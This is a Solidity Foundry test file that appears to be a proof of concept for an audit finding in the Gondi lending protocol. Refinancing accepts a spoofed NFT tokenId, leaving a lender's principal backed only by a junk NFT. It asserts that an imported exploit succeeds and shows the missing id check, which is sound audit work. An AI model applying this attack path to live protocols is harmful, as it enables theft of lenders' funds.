// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "./35206-h-04-function-refinancefromloanexecutiondata-does-not-check.sol";

/*//////////////////////////////////////////////////////////////////////////
    Gondi [H-04] — refinance validates spoofed tokenId, escrow stays junk.

    Harm: lender funded a PRINCIPAL loan believing blue-chip collateral; the
    only escrowed NFT is still the junk id. Control: matching-id check would
    have required executionData.tokenId == loan.nftCollateralTokenId.
//////////////////////////////////////////////////////////////////////////*/
contract RefinanceTokenIdTest is Test {
    function test_refinance_spoofed_tokenId_undercollateralizes_lender() public {
        Exploit exp = new Exploit();
        exp.run();

        assertEq(exp.escrowedId(), exp.JUNK_ID(), "junk still escrowed");
        assertEq(exp.nft().ownerOf(exp.JUNK_ID()), address(exp.loanContract()), "protocol holds junk");
        assertTrue(exp.nft().ownerOf(exp.BLUECHIP_ID()) != address(exp.loanContract()), "bluechip not escrowed");
        assertEq(exp.lenderLoss(), exp.PRINCIPAL(), "outstanding principal against junk");

        (,,, uint256 recordedId,,, bool active) = exp.loanContract().loans(2);
        assertTrue(active, "new loan active");
        assertEq(recordedId, exp.JUNK_ID(), "recorded id is junk");
    }

    function test_control_matching_id_required_would_block() public {
        // Demonstrate the intended check: spoofed id != escrowed id.
        uint256 escrowed = 999;
        uint256 spoofed = 1;
        assertTrue(spoofed != escrowed, "ids differ - require would revert");
    }
}
